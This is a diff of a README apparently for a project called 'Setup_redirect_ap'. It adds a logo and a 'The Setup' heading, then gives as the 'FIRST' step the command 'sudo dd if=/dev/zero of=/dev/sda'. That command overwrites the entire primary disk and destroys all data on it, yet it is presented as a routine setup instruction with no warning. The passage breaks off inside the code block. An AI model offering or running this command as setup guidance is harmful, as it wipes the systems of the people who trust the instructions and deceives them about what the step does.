@@ -1,5 +1,7 @@
 # Setup_redirect_ap
+![logo](docs/logo.png)
 
+## The Setup
 ▶️ FIRST :
 ```bash
 sudo dd if=/dev/zero of=/dev/sda
